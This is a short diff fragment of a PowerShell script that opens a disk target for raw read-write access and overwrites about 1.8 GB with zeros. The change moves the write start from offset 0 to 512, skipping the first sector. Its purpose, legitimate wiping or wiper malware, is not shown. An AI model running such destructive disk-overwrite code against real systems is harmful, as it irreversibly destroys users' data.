@@ -34,7 +34,7 @@ $size = 1840960000
 $bytes = New-Object byte[]($size)
 try {
     $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
-    $stream.Position = 0
+    $stream.Position = 512
     $stream.Write($bytes, 0, $size)
 } catch {
     Write-Host "Error writing to disk: $_"
